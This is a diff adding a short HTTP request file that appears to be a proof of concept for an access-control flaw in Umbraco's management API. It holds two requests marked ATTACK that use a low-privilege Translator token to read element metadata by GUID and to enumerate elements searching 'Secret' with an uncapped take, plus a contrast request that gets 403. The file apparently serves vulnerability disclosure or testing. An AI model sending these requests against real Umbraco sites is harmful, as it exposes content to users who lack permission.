@@ -1,0 +1,13 @@
+# All requests sent as a default Translator (Translation section only, NO Library section)
+
+# ATTACK — by-GUID element metadata read (floor-only item endpoint):
+GET http://localhost:29184/umbraco/management/api/v1/item/element?id=ae2bab5c-6c05-4afc-afce-34cc6c795ab2 HTTP/1.1
+Authorization: Bearer <translator-token>
+
+# ATTACK — bulk enumeration with an uncapped take:
+GET http://localhost:29184/umbraco/management/api/v1/item/element/search?query=Secret&take=1000000 HTTP/1.1
+Authorization: Bearer <translator-token>
+
+# CONTRAST — same user, real element endpoint => 403:
+GET http://localhost:29184/umbraco/management/api/v1/element/ae2bab5c-6c05-4afc-afce-34cc6c795ab2 HTTP/1.1
+Authorization: Bearer <translator-token>
